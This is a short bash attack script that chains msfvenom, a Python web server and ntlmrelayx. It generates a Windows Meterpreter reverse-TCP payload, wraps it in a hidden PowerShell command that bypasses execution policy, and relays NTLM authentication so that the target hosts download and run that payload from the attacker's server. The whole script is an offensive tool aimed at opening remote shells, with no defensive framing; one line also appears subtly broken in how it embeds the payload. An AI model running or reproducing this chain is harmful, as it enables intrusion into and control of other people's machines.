#!/usr/bin/env bash

LBlue='\033[0;94m'      # Ligth Blue
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

while [ ! -f .attack ];do
    clear
    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Web Server...${Color_Off}\n"
    sleep 5
done

HOST=$(cat host.txt)

# Set the variables for the payload
PAYLOAD="windows/meterpreter/reverse_tcp"
LHOST="$HOST"
LPORT="5040"
OUTPUT_FILE="meterpreter.ps1"

# Generate the Meterpreter payload using msfvenom
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f psh-cmd > $OUTPUT_FILE

# Append the generated payload to a PowerShell script
echo "powershell -exec bypass -nop -w hidden -c \"$($OUTPUT_FILE)\"" > PS.ps1

# Start a local web server to host the payload
python3 -m http.server &>/dev/null &

# Send the command to the target to download and execute the script
ntlmrelayx.py -tf target.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$HOST:8000/PS.ps1')" -smb2support
